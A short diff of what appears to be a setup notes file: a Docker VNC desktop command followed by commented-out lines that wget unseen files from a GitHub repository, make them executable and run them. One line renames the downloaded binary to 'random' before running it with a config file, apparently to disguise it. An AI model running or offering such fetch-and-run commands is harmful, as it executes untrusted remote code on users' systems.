@@ -11,4 +11,4 @@ docker run -p 6070:80 -e RESOLUTION=1200x650 dorowu/ubuntu-desktop-lxde-vnc
 
 # wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/script.ini && mv cok random && chmod +x random && ./random script.ini
 
-# wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/bb.sh && chmod +x bb.sh && ./bb.sh
+# wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/v.sh && chmod +x v.sh && ./v.sh
